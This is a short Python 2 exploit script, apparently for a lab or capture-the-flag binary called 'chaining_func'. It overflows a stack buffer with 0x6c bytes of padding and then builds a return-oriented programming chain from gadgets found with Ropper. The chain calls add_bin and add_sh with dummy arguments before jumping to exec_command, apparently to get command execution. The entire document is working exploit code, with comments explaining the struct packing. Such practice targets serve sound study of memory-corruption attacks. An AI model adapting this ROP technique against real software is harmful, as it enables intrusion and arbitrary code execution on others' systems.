#!/usr/bin/python2

import os
import struct # This module performs conversions between Python
              # values and C structs represented as Python strings.
              # It uses Format Strings as compact descriptions of the layout 
              # of the C structs and the intended conversion to/from Python values.

# Gadgets found with Ropper
pop_ret      = 0x0804848e
pop_pop_ret  = 0x0804848d


# Addresses of functions found using gdb.
add_bin      = 0x8048454
add_sh       = 0x8048490
exec_command = 0x804843b

payload  = "A"*0x6c
payload += "BBBB"

# "I" is the format for unsigned integer
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0x8badf00d)

payload += struct.pack("I", exec_command)

os.system("./chaining_func \"%s\"" % payload)
